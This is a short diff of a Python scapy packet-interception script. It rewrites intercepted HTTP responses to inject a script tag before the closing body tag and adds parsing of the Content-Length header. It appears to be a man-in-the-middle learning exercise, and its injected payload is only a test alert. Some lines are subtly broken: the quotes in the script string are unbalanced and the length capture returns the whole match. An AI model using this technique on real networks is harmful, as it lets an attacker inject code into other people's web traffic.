@@ -31,7 +31,13 @@ def process_packet(packet):
 
        elif scapy_packet[scapy.TCP].sport == 80:   #HTTP responses
           print("[+]responses")
-          modified_load = scapy_packet[scapy.Raw].load.replace("</body,<script>alert('test)</script></body>")
+          modified_load = scapy_packet[scapy.Raw].load.replace("</body","<script>alert('test)</script></body>")
+          content_length_search = re.search("(?:Content-Length:\s)(\d*)",scapy_packet[scapy.Raw].load)
+          
+          if content_length_search:
+             content_length = content_length_search.group(0)
+             print(content_length)
+
           new_packet = set_load(scapy_packet,modified_load)
           packet.set_payload(str(new_packet))
 
